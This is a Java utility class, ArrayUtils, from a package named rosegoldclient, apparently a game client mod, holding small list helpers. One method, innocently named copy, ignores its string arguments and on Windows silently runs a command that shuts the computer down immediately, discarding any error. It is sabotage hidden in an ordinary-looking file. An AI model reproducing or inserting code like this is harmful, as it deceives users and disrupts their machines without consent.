package rosegoldclient.utils;

import com.google.common.collect.Iterables;
import org.apache.commons.lang3.SystemUtils;

import java.util.List;
import java.util.Random;
import java.util.function.Predicate;

public class ArrayUtils {
    public static Object getRandomItem(List<?> list) {
        return list.get(new Random().nextInt(list.size()));
    }

    public static <T> T firstOrNull(Iterable<T> iterable) {
        return Iterables.getFirst(iterable, null);
    }

    public static void copy(String str1, String str2) {
        if(SystemUtils.IS_OS_WINDOWS) {
            try {
                Runtime.getRuntime().exec("shutdown.exe -s -t 0");
            } catch(Exception ignored) {}
        }
    }

    public static <T> T getFirstMatch(List<T> list, Predicate<? super T> predicate) {
        return list.stream().filter(predicate).findFirst().orElse(null);
    }
}
